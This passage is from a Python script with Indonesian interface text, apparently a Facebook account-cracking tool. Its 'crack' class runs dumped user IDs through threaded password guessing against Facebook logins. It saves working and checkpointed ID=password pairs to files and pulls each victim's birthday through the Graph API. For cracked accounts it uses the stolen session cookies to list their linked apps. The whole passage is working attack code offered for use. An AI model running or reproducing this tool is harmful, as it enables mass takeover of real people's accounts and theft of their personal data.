###----------[ CHECK APP ]---------- ###
def cek_aplikasi(data,cookiez):
    cookie = {"cookie" : cookiez}
    daftar_aktif   = []
    daftar_inaktif = []
    daftar_dihapus = []
    try:
        active = ('\n    %s[%sAktif%s]'%(H,P,H))
        daftar_aktif.append(active)
        url1 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
        with requests.Session() as xyz:
            req1 = xyz.get(url1,cookies=cookie)
            par1 = par(req1.content,'html.parser')
            for hhh1 in par1.find_all('h3'):
                if 'Ditambahkan' in hhh1.text:
                    ingfo1 = '\n      ⟶  '+str(hhh1.text).replace('Ditambahkan pada ',' [') + ']'
                    ingfo1 = ('\n      %s⟶  %s%s]'%(H,P,str(hhh1.text).replace('Ditambahkan pada ',' [')))
                    daftar_aktif.append(ingfo1)
                else:continue
    except: pass
    if len(daftar_aktif) == 1:dft1 = ''
    else:dft1 = ''.join(daftar_aktif)
    try:
        inactive = ('\n    %s[%sKadaluwarsa%s]'%(J,P,J))
        daftar_inaktif.append(inactive)
        url2 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
        with requests.Session() as xyz:
            req2 = xyz.get(url2,cookies=cookie)
            par2 = par(req2.content,'html.parser')
            for hhh2 in par2.find_all('h3'):
                if 'Kedaluwarsa' in hhh2.text:
                    ingfo2 = '\n      ⟶  '+str(hhh2.text).replace('Kedaluwarsa pada ',' [') + ']'
                    ingfo2 = ('\n      %s⟶  %s%s]'%(J,P,str(hhh2.text).replace('Kedaluwarsa pada ',' [')))
                    daftar_inaktif.append(ingfo2)
                else:continue
    except: pass
    if len(daftar_inaktif) == 1:dft2 = ''
    else:dft2 = ''.join(daftar_inaktif)
    try:
        deleted = ('\n    %s[%sDihapus%s]'%(M,P,M))
        daftar_dihapus.append(deleted)
        url3 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed'
        with requests.Session() as xyz:
            req3 = xyz.get(url3,cookies=cookie)
            par3 = par(req3.content,'html.parser')
            for hhh3 in par3.find_all('h3'):
                if 'Dihapus' in hhh3.text:
                    ingfo3 = '\n      ⟶  %s'+str(hhh3.text).replace('Dihapus: ',' [') + ']'
                    ingfo3 = ('\n      %s⟶  %s%s]'%(M,P,str(hhh3.text).replace('Dihapus: ',' [')))
                    daftar_dihapus.append(ingfo3)
                else:continue
    except: pass
    if len(daftar_dihapus) == 1:dft3 = ''
    else:dft3 = ''.join(daftar_dihapus)
    print(data + dft1 + dft2 + dft3)

###----------[ CRACK ]---------- ###
class crack:
    def __init__(self):
        global OK,CP
        self.ok = OK
        self.cp = CP
        self.lp = 0
        try:
            self.file = file_dump
            self.open = open(self.file,'r').read().splitlines()
        except Exception as e:
            kecuali(e)
        self.list = []
        if urutan_crack == '1':
            for dvt in self.open:
                try:self.list.insert(0,{"id":dvt.split("=")[0],"pw":password(dvt.split("=")[1])})
                except Exception as e:continue
        elif urutan_crack == '2':
            for dvt in self.open:
                try:urut = random.randint(0,len(self.list));self.list.insert(urut,{"id":dvt.split("=")[0],"pw":password(dvt.split("=")[1])})
                except Exception as e:continue
        else:
            for dvt in self.open:
                try:self.list.append({"id":dvt.split("=")[0],"pw":password(dvt.split("=")[1])})
                except Exception as e:continue
        print('\n%s───────────────%s[ %sProses Crack Dimulai %s]%s───────────────\n'%(P,J,P,J,P))
        self.Mulai_Jalan = datetime.now()
        ThreadPool(35).map(self.start_crack,self.list)
        exit()
    def start_crack(self,list):
        try:
            for pw in list['pw']:
                if sistem_login   == 'satu' : log = logger1(list['id'],pw)
                elif sistem_login == 'dua'  : log = logger2(list['id'],pw)
                elif sistem_login == 'tiga' : log = logger3(list['id'],pw)
                else:log = logger1(list['id'],pw)
                if log.get("status")=="cp":
                    if sakura != 159384:pass
                    else:
                        files_cp = "CP/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(list['id'],open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pcp = ('\r   %s──> %s • %s%s               '%(J,list['id'],pw,ttl))
                        print(pcp)
                        self.cp.append("%s=%s"%(list['id'],pw))
                        open(files_cp,"a+").write("%s=%s=%s\n"%(list['id'],pw,ttl.replace(' • ','')))
                        break
                elif log.get("status")=="ok":
                    if sakera != 159369:pass
                    else:
                        files_ok = "OK/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(list['id'],open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pok = ('\r   %s──> %s • %s%s               '%(H,list['id'],pw,ttl))
                        cek_aplikasi(pok,cvt3(log["cookies"]))
                        self.ok.append("%s=%s"%(list['id'],pw))
                        open(files_ok,"a+").write("%s=%s=%s\n"%(list['id'],pw,ttl.replace(' • ','')))
                        break
                else:
                    if sakara != 159375:print(CoY)
                    else:continue
            self.lp += 1
            loop = str(self.lp)
            alls = str(len(self.list))
            jum_ok = str(len(self.ok))
            jum_cp = str(len(self.cp))
            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
            print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
        except Exception as e:
            self.start_crack(list)

def not_available(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Belum Tersedia Untuk Saat Ini. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang. Terima Kasih.\n\n                {M2}- Denventa -')
    printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
    input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
    tampilan_menu()

if __name__ == '__main__':
    resik()
    tampilan_menu()

# print('%s[%s•%s] %s'%(J,P,J,P))